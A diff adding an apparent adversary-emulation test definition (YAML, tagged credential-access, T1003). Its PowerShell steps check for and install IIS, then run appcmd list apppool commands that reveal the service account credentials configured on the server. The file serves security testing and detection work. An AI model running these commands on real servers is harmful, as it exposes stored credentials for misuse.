@@ -1,0 +1,20 @@
+- id: 572410e9-2138-5075-88ff-afa66fb541ea
+  name: Soumaia ART Tests - Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)
+  description: 'AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
+
+    [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA) (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: OS Credential Dumping
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKAAoAEcAZQB0AC0AVwBpAG4AZABvAHcAcwBGAGUAYQB0AHUAcgBlACAAVwBlAGIALQBTAGUAcgB2AGUAcgApAC4ASQBuAHMAdABhAGwAbABTAHQAYQB0AGUAIAAtAGUAcQAgACIASQBuAHMAdABhAGwAbABlAGQAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMARgBlAGEAdAB1AHIAZQAgAC0AbgBhAG0AZQAgAFcAZQBiAC0AUwBlAHIAdgBlAHIAIAAtAEkAbgBjAGwAdQBkAGUATQBhAG4AYQBnAGUAbQBlAG4AdABUAG8AbwBsAHMA
+          }
+          C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
+          C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
+          C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
